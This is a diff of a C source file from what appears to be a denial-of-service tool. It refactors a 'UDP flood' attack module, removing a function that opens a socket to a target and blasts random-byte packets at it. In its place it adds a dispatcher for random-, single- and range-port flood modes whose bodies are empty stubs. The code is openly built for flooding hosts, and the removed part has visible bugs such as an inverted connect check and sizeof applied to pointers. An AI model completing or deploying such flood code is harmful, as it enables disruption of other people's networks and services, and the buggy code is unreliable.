@@ -12,61 +12,13 @@
 // See the License for the specific language governing permissions and
 // limitations under the License.
 
-#include <stdio.h>
-#include <string.h>
-#include <unistd.h>
-
-#include <lib/conn.h>
 #include <lib/info.h>
-#include <lib/mem.h>
-#include <lib/util.h>
 
-#include "flood.h"
+#include "udp_flood.h"
 
-// flood_setup4 fill up the conn4_t structure with the coresponding
-// information in order to fully bind the udp socket at a given host
-void flood_setup4(conn4_t *conn, const char *host)
-{
-	if (!conn)
-		INFOEE("Empty ipv4 conn pointer, please pass a non null conn");
-
-	if (!host)
-		INFOEE("Empty host, cand set up the udp conn");
-
-	uint16_t port		   = port_random();
-	conn->addr->sin_family = AF_INET;
-	conn->addr->sin_port   = htons(port);
-	// we don't need the extra check because at the begining
-	// we already parsed host to check if it's valid or not.
-	inet_pton(AF_INET, host, &conn->addr->sin_addr);
-	conn->sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-	if (!conn->sock)
-		INFOEE("Could not create the upd socket");
-
-	if (!connect(conn->sock, (SA*)&conn->addr, sizeof(conn->addr)))
-		INFOEE("Could not connect the udp socket");
-
-	conn->buff = xzmalloc(PK_SIZE * sizeof(conn->buff));
-	for (int i = 0; i < PK_SIZE; i++)
-		// fill up the buffer with random data.
-		urandom_bytes(&conn->buff[i], sizeof(conn->buff[i]));
-}
-
-void flood_attack4(conn4_t *c)
-{
-	ssize_t n = 0;
-	
-	STATUS("Guns are ready... Fire !");
-	for (size_t i=0; i<1; i++) {
-		n = send(c->sock, c->buff, PK_SIZE * sizeof(c->buff), 0);
-		if (!n) {
-			WSTATUS("Could not send udp packet ...");
-			break;
-		}
-		printf("Send packet of size %lu\n", n);
-		printf("Send this pkg %s\n", c->buff);
-	}
-}
+// udp_flood_attack_fn type for specifing what implementation to use
+// in case of a udp flood attack.
+typedef void (*udp_flood_attack_fn)(void);
 
 /*
  * Udp flood
@@ -92,7 +44,53 @@ void flood_attack4(conn4_t *c)
  * and start the attack.
  *
  */
-void flood(conn_t *conn)
+static udp_flood_attack_fn impl;
+
+static conn_t *connection;
+
+static void random_port(void)
 {
-	flood_attack4(conn->c4);
+}
+
+static void single_port(void)
+{
+}
+
+static void range_port(void)
+{
+}
+
+void udp_flood_attack(void)
+{
+	if (!connection)
+		INFOEE("Underlying connection pointer is NULL");
+
+	if (!impl)
+		INFOEE("Udp attack implementation is currently NULL");
+
+	impl(); /*launch the attack*/
+}
+
+void udp_flood_init(conn_t *conn, arguments args)
+{
+	if (!conn)
+		INFOEE("Invalid connection pointer passed");
+
+	if (args.port.random) {
+		DEBUG("Udp flood is choosing random port attack implementation");
+		impl = random_port;
+		return;
+	}
+
+	if (args.port.n) {
+		DEBUG("Udp flood is choosing single port attack implementation");
+		impl = single_port;
+		return;
+	}
+
+	if ((args.port.high != 0) && (args.port.high > args.port.low)) {
+		DEBUG("Udp flood is choosing range port attack implementation");
+		impl = range_port;
+		return;
+	}
 }
